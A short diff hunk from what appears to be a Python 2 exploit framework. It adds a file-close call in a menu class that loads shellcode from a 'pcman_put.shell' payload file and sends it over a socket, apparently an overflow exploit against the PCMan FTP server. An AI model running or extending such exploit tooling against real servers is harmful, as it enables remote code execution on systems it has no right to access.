@@ -83,6 +83,7 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     f = open("../../../payloads/pcman_put.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
+    f.close()
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
